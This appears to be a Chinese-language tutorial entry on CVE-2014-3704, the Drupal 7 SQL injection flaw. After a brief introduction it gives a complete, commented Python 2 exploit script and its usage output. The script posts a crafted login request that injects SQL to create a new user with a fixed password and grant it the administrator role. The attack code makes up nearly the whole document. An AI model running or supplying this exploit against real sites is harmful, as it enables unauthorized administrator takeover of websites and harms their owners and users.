# 用例 4: CVE-2014-3704

# CVE-2014-3704

* * *

Drupal 在 2014 年 10 月 15 日宣布修复了一处 SQL 注入漏洞。漏洞的具体分析可以查看[这里](https://blog.sucuri.net/2014/10/highly-critical-sql-injection-on-drupal.html).下面这段代码是通过 Python 编写的一段代码来实现一个 SQL 注入的功能,这个脚本正确执行之后会添加一个新的管理员用户:

脚本调用语法,需要你输入你要创建的帐户名和密码:

```py
~$ python cve-2014-3704.py <URL>
[+] Attempting CVE-2014-3704 Drupal 7.x SQLi
Username to add: admin_user
Account created with user: admin_user and password: password 
```

代码示例:

```py
#!/usr/bin/python
import sys, urllib2 # 导入需要的模块

if len(sys.argv) != 2: # 检查输入的格式是否正确"<script> <URL>"
 print "Usage: "+sys.argv[0]+" [URL]"
 sys.exit(0)

URL=sys.argv[1] # 输出测试的 URL
print "[+] Attempting CVE-2014-3704 Drupal 7.x SQLi"
user=raw_input("Username to add: ") # 获取输入的 username 和 password

Host = URL.split('/')[2] # 从 URL 解析主机名: 'http://<host>/' 并且赋值给 Host <host>

headers = { # 定义响应头部

 'Host': Host,
 'User-Agent': 'Mozilla',
 'Connection': 'keep-alive'}

#提交的格式化后的 SQL:

# insert into users (uid, name, pass, mail, status) select max(uid)+1, '"+user+"', '[password_hash]', 'email@gmail.com', 1 from users; insert into users_roles (uid, rid) VALUES ((select uid from users where name='"+user+"'), (select rid from role where name = 'administrator')

data = "name%5b0%20%3binsert%20into%20users%20%28uid%2c%20name%2c%20pass%2c%20mail%2c%20status%29%20select%20max%28uid%29%2b1%2c%20%27"+user+"%27%2c%20%27%24S%24$S$CTo9G7Lx27gCe3dTBYhLhZOTqtJrlc7n31BjHl/aWgfK82GIACiTExGY3A9yrK1l3DdUONFFv8xV8SH9wr4r23HJauz47c/%27%2c%20%27email%40gmail.com%27%2c%201%20from%20users%3b%20insert%20into%20users_roles%20%28uid%2c%20rid%29%20VALUES%20%28%28select%20uid%20from%20users%20where%20name%3d%27"+user+"%27%29%2c%20%28select%20rid%20from%20role%20where%20name%20%3d%20%27administrator%27%29%29%3b%3b%20%23%20%5d=zRGAcKznoV&name%5b0%5d=aYxxuroJbo&pass=lGiEbjpEGm&form_build_id=form-5gCSidRr8NruKFEYt3eunbFEhLCfJaGuqGAnu80Vv0M&form_id=user_login_block&op=Log%20in"
req = urllib2.Request(URL+"?q=node&destination=node", data, headers)

try: # 使用 Try/Except 处理响应信息

 response = urllib2.urlopen(req) # 发起请求
 print "Account created with user: "+user+" and password: password"
except Exception as e: print e 
```